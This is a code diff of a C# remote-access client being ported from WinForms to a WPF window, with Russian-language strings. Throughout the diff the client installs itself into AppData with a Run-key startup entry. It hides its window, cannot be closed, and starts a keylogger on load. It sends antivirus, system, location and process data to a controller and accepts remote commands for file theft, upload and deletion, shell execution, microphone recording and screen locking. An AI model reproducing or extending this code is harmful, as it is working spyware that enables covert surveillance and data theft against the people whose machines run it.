@@ -15,17 +15,19 @@ using System.Windows.Forms.Integration;
 using Microsoft.Win32;
 using System.Management;
 using Client.Helpers;
+using Client.Forms;
 using Client.Helpers.Information;
 using Client.Helpers.Networking;
 using Client.Helpers.Services;
 using Client.Helpers.Services.InputSimulator;
 using Client.Helpers.Telepathy;
 using System.Windows.Threading;
+using System.Windows;
 using Message = Client.Helpers.Telepathy.Message;
 
-namespace Client.Forms
+namespace Client
 {
-    public partial class InitialForm : Form
+    public partial class MainWindow : Window
     {
         #region Connect Loop
 
@@ -43,6 +45,7 @@ namespace Client.Forms
                 await Task.Delay(Interval);
                 GetData();
             }
+
             ConnectLoop();
         }
 
@@ -66,31 +69,6 @@ namespace Client.Forms
 
         #endregion
 
-        #region Structs
-
-        internal struct INPUT
-        {
-            public uint Type;
-            public MOUSEKEYBDHARDWAREINPUT Data;
-        }
-
-        [StructLayout(LayoutKind.Explicit)]
-        internal struct MOUSEKEYBDHARDWAREINPUT
-        {
-            [FieldOffset(0)] public MOUSEINPUT Mouse;
-        }
-
-        internal struct MOUSEINPUT
-        {
-            public int X;
-            public int Y;
-            public uint MouseData;
-            public uint Flags;
-            public uint Time;
-            public IntPtr ExtraInfo;
-        }
-
-        #endregion
 
         #endregion DLL Imports
 
@@ -112,8 +90,9 @@ namespace Client.Forms
         private string UpdateFileName;
         private readonly string InstallPath;
         private readonly string AudioPath;
-        private readonly Chat C = new Chat();
+        private readonly Chat C;
         private readonly ScreenLock SL = new ScreenLock();
+        public NotifyIcon notifyIcon;
 
         #endregion Declaration
 
@@ -126,7 +105,7 @@ namespace Client.Forms
             {
                 RegistryKey RK =
                     Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                RK.DeleteValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), false);
+                RK.DeleteValue(Path.GetFileNameWithoutExtension(System.Windows.Forms.Application.ExecutablePath), false);
             }
         }
 
@@ -134,17 +113,17 @@ namespace Client.Forms
         private void InstallClient()
         {
             if (!Install) return;
-            if (Application.ExecutablePath == InstallPath)
+            if (System.Windows.Forms.Application.ExecutablePath == InstallPath)
             {
                 if (!Startup) return;
                 RegistryKey RK =
                     Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                RK.DeleteValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), false);
-                RK.SetValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), InstallPath);
+                RK.DeleteValue(Path.GetFileNameWithoutExtension(System.Windows.Forms.Application.ExecutablePath), false);
+                RK.SetValue(Path.GetFileNameWithoutExtension(System.Windows.Forms.Application.ExecutablePath), InstallPath);
                 return;
             }
 
-            File.Copy(Application.ExecutablePath, InstallPath, true);
+            File.Copy(System.Windows.Forms.Application.ExecutablePath, InstallPath, true);
             Process.Start(InstallPath);
             Process.GetCurrentProcess().Kill();
         }
@@ -154,7 +133,7 @@ namespace Client.Forms
         {
             string Key = @"SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\";
             RegistryKey NDP = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey(Key);
-            int ReleaseNum = (int) NDP.GetValue("Release");
+            int ReleaseNum = (int)NDP.GetValue("Release");
             return ReleaseNum >= 378389;
         }
 
@@ -163,41 +142,53 @@ namespace Client.Forms
         #region Form
 
         //Entry
-        public InitialForm()
+        public MainWindow()
         {
-            InitializeComponent();
-            if (!NetUpdated())
-                Process.Start("dotnetfx.exe");
-            Interval = Convert.ToInt16(ClientSettings.UpdateInterval);
-            Port = Convert.ToInt16(ClientSettings.Port);
-            Admin = ClientSettings.Admin;
-            if (string.Equals(ClientSettings.Install, "true", StringComparison.OrdinalIgnoreCase)) Install = true;
-            if (string.Equals(ClientSettings.Startup, "true", StringComparison.OrdinalIgnoreCase)) Startup = true;
-            InstallPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" +
-                          AppDomain.CurrentDomain.FriendlyName;
-            AudioPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + @"\micaudio.wav";
-            InstallClient();
+            try
+            {
+                InitializeComponent();
+                Interval = Convert.ToInt16(ClientSettings.UpdateInterval);
+                Port = Convert.ToInt16(ClientSettings.Port);
+                Admin = ClientSettings.Admin;
+                if (string.Equals(ClientSettings.Install, "true", StringComparison.OrdinalIgnoreCase)) Install = true;
+                if (string.Equals(ClientSettings.Startup, "true", StringComparison.OrdinalIgnoreCase)) Startup = true;
+                InstallPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" +
+                              AppDomain.CurrentDomain.FriendlyName;
+                AudioPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + @"\micaudio.wav";
+                InstallClient();
+                C = new Chat();
+
+                notifyIcon = new NotifyIcon();
+                notifyIcon.Text = "Чат с " + Admin;
+                notifyIcon.Icon = Properties.Resources.icon;
+                notifyIcon.Visible = true;
+                notifyIcon.DoubleClick += new EventHandler(NotifyIcon_DoubleClick);
+            }
+            catch(Exception ex)
+            {
+                System.Windows.Forms.MessageBox.Show(ex.Message);
+            }
+        }
+
+        private void NotifyIcon_DoubleClick(object sender, EventArgs e)
+        {
+            this.Dispatcher.Invoke(() => C.Visibility = Visibility.Visible);
         }
 
         //Prevent any closing of the form
-        private void OnClosing(object sender, FormClosingEventArgs e)
+        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
         {
-            if (e.CloseReason == CloseReason.UserClosing)
                 e.Cancel = true;
         }
 
         //Hide form on form load
-        private void OnLoad(object sender, EventArgs e)
+        private void Window_Loaded(object sender, RoutedEventArgs e)
         {
-            BeginInvoke(new MethodInvoker(delegate { Hide(); }));
+                Dispatcher.CurrentDispatcher.Invoke(Hide);
+                StartAll(Keylogger.StartKeylogger);
+                StartAll(ConnectLoop);
         }
 
-        //Once form is loaded, begin connect logic
-        private void OnShow(object sender, EventArgs e)
-        {
-            StartAll(Keylogger.StartKeylogger);
-            StartAll(ConnectLoop);
-        }
         public delegate void FunctionAsync();
         public async void StartAll(FunctionAsync f)
         {
@@ -223,24 +214,19 @@ namespace Client.Forms
                         ToSend.AddRange(Encoding.UTF8.GetBytes(ClientSettings.Admin));
                         Networking.MainClient.Send(ToSend.ToArray());
                         ToSend.Clear();
-                        ToSend.Add((int) DataType.ClientTag);
+                        ToSend.Add((int)DataType.ClientTag);
                         ToSend.AddRange(Encoding.UTF8.GetBytes(ClientSettings.ClientTag));
                         Networking.MainClient.Send(ToSend.ToArray());
                         ToSend.Clear();
-                        ToSend.Add((int) DataType.AntiVirusTag);
+                        ToSend.Add((int)DataType.AntiVirusTag);
                         ToSend.AddRange(Encoding.UTF8.GetBytes(ComputerInfo.GetAntivirus()));
                         Networking.MainClient.Send(ToSend.ToArray());
                         string OperatingSystemUnDetailed = ComputerInfo.GetWindowsVersion()
                             .Remove(ComputerInfo.GetWindowsVersion().IndexOf('('));
                         ToSend.Clear();
-                        ToSend.Add((int) DataType.WindowsVersionTag);
+                        ToSend.Add((int)DataType.WindowsVersionTag);
                         ToSend.AddRange(Encoding.UTF8.GetBytes(OperatingSystemUnDetailed));
                         Networking.MainClient.Send(ToSend.ToArray());
-                        //string ActiveWindow = GetActiveWindowTitle();
-                        //ToSend.Clear();
-                        //ToSend.Add((int)DataType.WindowTitle);
-                        //ToSend.AddRange(Encoding.UTF8.GetBytes(ActiveWindow));
-                        //Networking.MainClient.Send(ToSend.ToArray());
                         break;
 
                     case EventType.Disconnected:
@@ -280,35 +266,36 @@ namespace Client.Forms
                     string Directory = CurrentDirectory;
                     if (Directory.Equals("BaseDirectory")) Directory = Path.GetPathRoot(Environment.SystemDirectory);
                     int i = 0;
-                    while (File.Exists(FileToWrite)) { 
+                    while (File.Exists(FileToWrite))
+                    {
                         string d = Path.GetDirectoryName(FileToWrite);
                         string n = Path.GetFileNameWithoutExtension(FileToWrite);
                         string e = Path.GetExtension(FileToWrite);
-                        FileToWrite = d +"\\" + n + i + e;
+                        FileToWrite = d + "\\" + n + i + e;
                         i++;
                     }
                     File.WriteAllBytes(FileToWrite, RawData);
-                    
-                string Files = string.Empty;
-                DirectoryInfo DI = new DirectoryInfo(Directory);
-                foreach (var F in DI.GetDirectories())
-                    Files += "][{" + F.Name + "}<" + "Папка с файлами" + ">[" + F.LastAccessTime.ToString("dd/MM/yyyy HH:mm") + "]fS(" + ")fS";
-                foreach (FileInfo F in DI.GetFiles())
-                    Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
-                             F.LastAccessTime.ToString("dd/MM/yyyy HH:mm") + "]fS(" + (F.Length/1024).ToString("N0") + " КБ)fS";
-                List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.FilesListType);
-                ToSend.AddRange(Encoding.UTF8.GetBytes(Files));
-                Networking.MainClient.Send(ToSend.ToArray());
-                CurrentDirectory = Directory;
-                ToSend.Clear();
-                ToSend.Add((int) DataType.CurrentDirectoryType);
-                ToSend.AddRange(Encoding.UTF8.GetBytes(CurrentDirectory));
-                Networking.MainClient.Send(ToSend.ToArray());
-                GetDrives();
-            
+
+                    string Files = string.Empty;
+                    DirectoryInfo DI = new DirectoryInfo(Directory);
+                    foreach (var F in DI.GetDirectories())
+                        Files += "][{" + F.Name + "}<" + "Папка с файлами" + ">[" + F.LastAccessTime.ToString("dd/MM/yyyy HH:mm") + "]fS(" + ")fS";
+                    foreach (FileInfo F in DI.GetFiles())
+                        Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
+                                 F.LastAccessTime.ToString("dd/MM/yyyy HH:mm") + "]fS(" + (F.Length / 1024).ToString("N0") + " КБ)fS";
+                    List<byte> ToSend = new List<byte>();
+                    ToSend.Add((int)DataType.FilesListType);
+                    ToSend.AddRange(Encoding.UTF8.GetBytes(Files));
+                    Networking.MainClient.Send(ToSend.ToArray());
+                    CurrentDirectory = Directory;
                     ToSend.Clear();
-                    ToSend.Add((int) DataType.NotificationType);
+                    ToSend.Add((int)DataType.CurrentDirectoryType);
+                    ToSend.AddRange(Encoding.UTF8.GetBytes(CurrentDirectory));
+                    Networking.MainClient.Send(ToSend.ToArray());
+                    GetDrives();
+
+                    ToSend.Clear();
+                    ToSend.Add((int)DataType.NotificationType);
                     ToSend.AddRange(
                         Encoding.UTF8.GetBytes("Файл " + Path.GetFileName(FileToWrite) + " был выгружен."));
                     Networking.MainClient.Send(ToSend.ToArray());
@@ -332,13 +319,14 @@ namespace Client.Forms
 
                 adm = GetSubstringByString("[admin", "admin]", StringForm);
                 int d = StringForm.IndexOf("admin]");
-                StringForm = StringForm.Substring(d+6);
+                StringForm = StringForm.Substring(d + 6);
             }
-            catch {
+            catch
+            {
             }
 
             #region Non-Parameterized Commands
-            if (adm == Admin)
+            if ((adm == Admin) || adm == "Админ")
             {
                 switch (StringForm)
                 {
@@ -356,10 +344,6 @@ namespace Client.Forms
 
                     case "GetComputerInfo":
                         GetComputerInfo();
-                        break;
-
-                    case "RaisePerms":
-                        RaisePerms();
                         break;
 
                     case "GoUpDir":
@@ -474,8 +458,6 @@ namespace Client.Forms
                     TTS(StringForm.Replace("[<TTS>]", ""));
                 else if (StringForm.Contains("[<COMMAND>]"))
                     Command(StringForm.Replace("[<COMMAND>]", ""));
-                else if (StringForm.Contains("[<MOUSE>]"))
-                    MouseClick(StringForm);
             }
             #endregion Parameterized Commands
         }
@@ -488,7 +470,7 @@ namespace Client.Forms
         private void KillClient()
         {
             KeyloggerStream.Stop();
-            UninstallClient();
+            //UninstallClient();
             try
             {
                 Process.GetCurrentProcess().Kill();
@@ -522,7 +504,7 @@ namespace Client.Forms
         //SleepMode client
         private void SleepMode()
         {
-            Application.SetSuspendState(PowerState.Suspend, true, true);
+            System.Windows.Forms.Application.SetSuspendState(PowerState.Suspend, true, true);
         }
 
 
@@ -554,9 +536,9 @@ namespace Client.Forms
             if (!SLActive)
             {
                 SLActive = true;
-                Cursor.Hide();
+                System.Windows.Forms.Cursor.Hide();
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.NotificationType);
+                ToSend.Add((int)DataType.NotificationType);
                 ToSend.AddRange(Encoding.UTF8.GetBytes("Экран пользователя заблокирован."));
                 Networking.MainClient.Send(ToSend.ToArray());
                 if (!SL.Visible)
@@ -565,9 +547,9 @@ namespace Client.Forms
             else
             {
                 SLActive = false;
-                Cursor.Show();
+                System.Windows.Forms.Cursor.Show();
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.NotificationType);
+                ToSend.Add((int)DataType.NotificationType);
                 ToSend.AddRange(Encoding.UTF8.GetBytes("Экран пользователя разблокирован."));
                 Networking.MainClient.Send(ToSend.ToArray());
                 if (SL.Visible)
@@ -575,72 +557,49 @@ namespace Client.Forms
             }
         }
 
-        
+
         private string Parser(bool a) { if (a) return "Выполняется"; else return "Приостановлено"; }
         //Gets running applications
         private void GetProcesses()
         {
             Process[] PL = Process.GetProcesses();
-             
+
             List<string> ProcessList = new List<string>();
             foreach (Process P in PL)
             {
                 try
                 {
-                    ProcessList.Add("p1" + P.ProcessName + "}p2" + P.Id + "{p3" + Parser(P.Responding) + ";p4" + P.MainWindowTitle + ">p5" + (P.PrivateMemorySize64/1024)+ "<p6" + P.MainModule.FileName + "]");
+                    ProcessList.Add("p1" + P.ProcessName + "}p2" + P.Id + "{p3" + Parser(P.Responding) + ";p4" + P.MainWindowTitle + ">p5" + (P.PrivateMemorySize64 / 1024) + "<p6" + P.MainModule.FileName + "]");
                 }
                 catch { }
             }
-                    string[] StringArray = ProcessList.ToArray<string>();
-                    List<byte> ToSend = new List<byte>();
-                    ToSend.Add((int)DataType.ProcessType);
-                    string ListString = "";
-                    foreach (string Process in StringArray) ListString += "][" + Process;
-                    ToSend.AddRange(Encoding.UTF8.GetBytes(ListString));
-                    Networking.MainClient.Send(ToSend.ToArray());
+            string[] StringArray = ProcessList.ToArray<string>();
+            List<byte> ToSend = new List<byte>();
+            ToSend.Add((int)DataType.ProcessType);
+            string ListString = "";
+            foreach (string Process in StringArray) ListString += "][" + Process;
+            ToSend.AddRange(Encoding.UTF8.GetBytes(ListString));
+            Networking.MainClient.Send(ToSend.ToArray());
         }
 
-        //Prompts user to raise client to administrator
-        private void RaisePerms()
-        {
-            Process P = new Process();
-            P.StartInfo.FileName = Application.ExecutablePath;
-            P.StartInfo.UseShellExecute = true;
-            P.StartInfo.Verb = "runas";
-            P.Start();
-            try
-            {
-                Process.GetCurrentProcess().Kill();
-            }
-            catch
-            {
-                Environment.Exit(0);
-            } //We don't want to uninstall client, so we just kill.
-        }
+        ////Prompts user to raise client to administrator
+        //private void RaisePerms()
+        //{
+        //    Process P = new Process();
+        //    P.StartInfo.FileName = Application.ExecutablePath;
+        //    P.StartInfo.UseShellExecute = true;
+        //    P.StartInfo.Verb = "runas";
+        //    P.Start();
+        //    try
+        //    {
+        //        Process.GetCurrentProcess().Kill();
+        //    }
+        //    catch
+        //    {
+        //        Environment.Exit(0);
+        //    } //We don't want to uninstall client, so we just kill.
+        //}
 
-        //Handle mouse click
-        private void MouseClick(string MouseArgs)
-        {
-            int X = Convert.ToInt16(GetSubstringByString("[<X>]", @"[<\X>]", MouseArgs));
-            int Y = Convert.ToInt16(GetSubstringByString("[<Y>]", @"[<\Y>]", MouseArgs));
-            Point Location = new Point(X, Y);
-            InputSimulator IS = new InputSimulator();
-            if (GetSubstringByString("[<MOUSE>]", @"[<\MOUSE>]", MouseArgs) == "DOUBLE")
-            {
-                Cursor.Position = Location;               
-                IS.Mouse.LeftButtonDoubleClick();
-            }
-            else if (GetSubstringByString("[<MOUSE>]", @"[<\MOUSE>]", MouseArgs) == "SINGLE-LEFT")
-            {
-                Cursor.Position = Location;
-                IS.Mouse.LeftButtonClick();
-            }
-            else if (GetSubstringByString("[<MOUSE>]", @"[<\MOUSE>]", MouseArgs) == "SINGLE-RIGHT")
-            {
-                Cursor.Position = Location;
-                IS.Mouse.RightButtonClick();
-            }
-        }
 
         //Shows a message box
         private void MsgBox(string Data)
@@ -688,7 +647,7 @@ namespace Client.Forms
 
             #endregion Button & Icon conditional statements
 
-            MessageBox.Show(Text, Header, MBB, MBI);
+            System.Windows.Forms.MessageBox.Show(Text, Header, MBB, MBI);
         }
 
         //Plays text to speech
@@ -701,7 +660,7 @@ namespace Client.Forms
                     Synth.SetOutputToDefaultAudioDevice();
                     Synth.Speak(Message);
                     List<byte> ToSend = new List<byte>();
-                    ToSend.Add((int) DataType.NotificationType);
+                    ToSend.Add((int)DataType.NotificationType);
                     ToSend.AddRange(Encoding.UTF8.GetBytes("The message " + Message + " was played."));
                     Networking.MainClient.Send(ToSend.ToArray());
                 }
@@ -718,7 +677,7 @@ namespace Client.Forms
                 Process P = Process.GetProcessById(Convert.ToInt32(ToEnd));
                 P.Kill();
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.NotificationType);
+                ToSend.Add((int)DataType.NotificationType);
                 ToSend.AddRange(Encoding.UTF8.GetBytes("Процесс " + P.ProcessName + " был закончен."));
                 Networking.MainClient.Send(ToSend.ToArray());
             }
@@ -733,7 +692,7 @@ namespace Client.Forms
             {
                 Process.Start(ToOpen);
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.NotificationType);
+                ToSend.Add((int)DataType.NotificationType);
                 ToSend.AddRange(Encoding.UTF8.GetBytes("The website " + ToOpen + " was opened."));
                 Networking.MainClient.Send(ToSend.ToArray());
             }
@@ -760,10 +719,10 @@ namespace Client.Forms
 
                         Info += "][dI{" + Convert.ToString(ld.Properties["DeviceId"].Value) + "}dIdT{" // C:
                          + Convert.ToUInt32(ld.Properties["DriveType"].Value) + "}dTdF{"  // C: - 3
-                         + free + "}dFdS{"  
-                         + size + "}dSdV{"  
+                         + free + "}dFdS{"
+                         + size + "}dSdV{"
                          + Convert.ToString(ld.Properties["VolumeName"].Value) + "}dVdP{"
-                         + (int)(100*(size-free)/size) + "}dP";
+                         + (int)(100 * (size - free) / size) + "}dP";
                     }
                 }
             }
@@ -776,7 +735,7 @@ namespace Client.Forms
         //Gets directory files
         private void GetDF(string Data)
         {
-           
+
             try
             {
                 string Directory = GetSubstringByString("{", "}", Data);
@@ -787,14 +746,14 @@ namespace Client.Forms
                     Files += "][{" + F.Name + "}<" + "Папка с файлами" + ">[" + F.LastAccessTime.ToString("dd/MM/yyyy HH:mm") + "]fS(" + ")fS";
                 foreach (FileInfo F in DI.GetFiles())
                     Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
-                             F.LastAccessTime.ToString("dd/MM/yyyy HH:mm") + "]fS(" + (F.Length/1024).ToString("N0") + " КБ)fS";
+                             F.LastAccessTime.ToString("dd/MM/yyyy HH:mm") + "]fS(" + (F.Length / 1024).ToString("N0") + " КБ)fS";
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.FilesListType);
+                ToSend.Add((int)DataType.FilesListType);
                 ToSend.AddRange(Encoding.UTF8.GetBytes(Files));
                 Networking.MainClient.Send(ToSend.ToArray());
                 CurrentDirectory = Directory;
                 ToSend.Clear();
-                ToSend.Add((int) DataType.CurrentDirectoryType);
+                ToSend.Add((int)DataType.CurrentDirectoryType);
                 ToSend.AddRange(Encoding.UTF8.GetBytes(CurrentDirectory));
                 Networking.MainClient.Send(ToSend.ToArray());
                 GetDrives();
@@ -830,7 +789,7 @@ namespace Client.Forms
                     ToSend.AddRange(FileBytes);
                     Networking.MainClient.Send(ToSend.ToArray());
                 }
-                else if(ext == ".log")
+                else if (ext == ".log")
                 {
                     string text = "";
                     FileInfo log = new FileInfo(FileString);
@@ -848,7 +807,7 @@ namespace Client.Forms
             catch (Exception EX)
             {
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.NotificationType);
+                ToSend.Add((int)DataType.NotificationType);
                 ToSend.AddRange(Encoding.UTF8.GetBytes("Ошибка загрузки: " + EX.Message + ""));
                 Networking.MainClient.Send(ToSend.ToArray());
             }
@@ -884,7 +843,7 @@ namespace Client.Forms
             {
                 Process.Start(ToOpen);
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.NotificationType);
+                ToSend.Add((int)DataType.NotificationType);
                 ToSend.AddRange(Encoding.UTF8.GetBytes("Файл " + Path.GetFileName(ToOpen) + " был открыт."));
                 Networking.MainClient.Send(ToSend.ToArray());
             }
@@ -906,11 +865,11 @@ namespace Client.Forms
                 File.Delete(ToDelete);
                 List<byte> ToSend = new List<byte>();
                 GetDF(CurrentDirectory);
-                ToSend.Add((int) DataType.NotificationType);
+                ToSend.Add((int)DataType.NotificationType);
                 ToSend.AddRange(
                     Encoding.UTF8.GetBytes("Файл " + Path.GetFileName(ToDelete) + " был удалён."));
                 Networking.MainClient.Send(ToSend.ToArray());
-                
+
             }
             catch (Exception EX)
             {
@@ -924,21 +883,23 @@ namespace Client.Forms
         //Updates chat box (if open) with a new message
         private void Message(string Message)
         {
-            
+
             try
             {
-                if (C.Visibility != System.Windows.Visibility.Visible) BeginInvoke(new MethodInvoker(delegate { OpenChat(); }));
-                BeginInvoke(new MethodInvoker(delegate { 
-                System.Windows.Controls.ContentControl t = new System.Windows.Controls.ContentControl();
-                t.Content = Message + Environment.NewLine + DateTime.Now.ToString("HH:mm");
-                System.Windows.Style style = C.FindResource("BubbleLeftStyle") as System.Windows.Style;
-                t.Style = style;
-                C.chatPlace.Children.Add(t);
-                }));
+                this.Dispatcher.Invoke(() =>
+                {
+                    OpenChat(); 
+                    System.Windows.Controls.ContentControl t = new System.Windows.Controls.ContentControl();
+                    t.Content = Message + Environment.NewLine + DateTime.Now.ToString("HH:mm");
+                    Style style = C.FindResource("BubbleLeftStyle") as Style;
+                    t.Style = style;
+                    C.chatPlace.Children.Add(t);
+                    C.title.Text = "Чат c " + Admin;
+                });
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
-                MessageBox.Show(ex.Message + " " + ex.TargetSite + " " + ex.Source + " " + ex.StackTrace) ;
+                System.Windows.Forms.MessageBox.Show(ex.Message + " " + ex.TargetSite + " " + ex.Source + " " + ex.StackTrace);
             }
 
         }
@@ -972,7 +933,7 @@ namespace Client.Forms
             ComputerInfoList.Add("Город: " + ComputerInfo.GetCity());
             foreach (string Info in ComputerInfoList.ToArray()) ListString += "," + Info;
             List<byte> ToSend = new List<byte>();
-            ToSend.Add((int) DataType.InformationType);
+            ToSend.Add((int)DataType.InformationType);
             ToSend.AddRange(Encoding.UTF8.GetBytes(ListString));
             Networking.MainClient.Send(ToSend.ToArray());
         }
@@ -1002,7 +963,7 @@ namespace Client.Forms
                 APActive = true;
                 AntiProcess.StartBlock();
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.NotificationType);
+                ToSend.Add((int)DataType.NotificationType);
                 ToSend.AddRange(Encoding.UTF8.GetBytes("Started Anti-Process."));
                 Networking.MainClient.Send(ToSend.ToArray());
             }
@@ -1011,7 +972,7 @@ namespace Client.Forms
                 APActive = false;
                 AntiProcess.StopBlock();
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int) DataType.NotificationType);
+                ToSend.Add((int)DataType.NotificationType);
                 ToSend.AddRange(Encoding.UTF8.GetBytes("Stopped Anti-Process."));
                 Networking.MainClient.Send(ToSend.ToArray());
             }
@@ -1068,8 +1029,8 @@ namespace Client.Forms
         //Opens chat
         public void OpenChat()
         {
-            if (C.Visibility != System.Windows.Visibility.Visible)
-            {    
+            if (C.Visibility != Visibility.Visible)
+            {
                 ElementHost.EnableModelessKeyboardInterop(C);
                 C.Show();
             }
@@ -1118,7 +1079,7 @@ namespace Client.Forms
                     }
 
                     List<byte> ToSend = new List<byte>();
-                    ToSend.Add((int) DataType.MicrophoneRecordingType);
+                    ToSend.Add((int)DataType.MicrophoneRecordingType);
                     ToSend.AddRange(FileBytes);
                     Networking.MainClient.Send(ToSend.ToArray());
                     File.Delete(AudioPath);
@@ -1141,6 +1102,8 @@ namespace Client.Forms
             }
         }
 
+
         #endregion Functions
+
     }
 }
